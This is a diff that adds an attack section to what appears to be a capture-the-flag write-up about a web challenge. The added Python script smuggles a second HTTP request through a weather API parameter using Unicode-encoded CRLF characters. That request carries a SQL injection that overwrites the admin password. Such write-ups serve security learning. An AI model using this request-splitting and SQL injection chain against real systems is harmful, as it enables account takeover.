@@ -156,7 +156,28 @@ Check the routing code of `/login`:
 We can see that if you log in with the Admin User we can access `/app/flag` and get the flag otherwise it sends you a message `'you are not admin'`.
 
 
-## Helpdesk
+## Atack
+
+```py
+   1   │ import requests
+   2   │ 
+   3   │ username = 'admin'
+   4   │ password = "') ON CONFLICT (username) DO UPDATE SET password = 'passwd123';--"
+   5   │ 
+   6   │ username = username.replace(" ","\u0120").replace("'", "%27").replace('"', "%22")
+   7   │ password = password.replace(" ","\u0120").replace("'", "%27").replace('"', "%22")
+   8   │ 
+   9   │ endpoint = "127.0.0.1/" + "\u0120" + "HTTP/1.1" + "\u010D\u010A"  +  "Host:" + "\u0120"\
+  10   │     + "127.0.0.1" + "\u010D\u010A" + "\u010D\u010A" + "POST" + "\u0120" + "/register" +\
+  11   │     "\u0120" + "HTTP/1.1" + "\u010D\u010A" + "Host:" + "\u0120" + "127.0.0.1" + "\u010D\u010A"\
+  12   │     + "Content-Type:" + "\u0120" + "application/x-www-form-urlencoded" + "\u010D\u010A" + \
+  13   │     "Content-Length:" + "\u0120" + str(len(username) + len(password) + 19) + \
+  14   │     "\u010D\u010A" + "\u010D\u010A" + "username=" + username + "&password=" + password\
+  15   │     + "\u010D\u010A" + "\u010D\u010A" + "GET" + "\u0120"
+  16   │ 
+  17   │ requests.post('http://167.172.62.51:32440/api/weather', json={'endpoint': endpoint, 'city': 'lol', 'countr
+       │ y': 'lol'})
+```
 
 The Helpdesk page uses the OsTicket web application. It allows users to create and view the status of ticket.
 
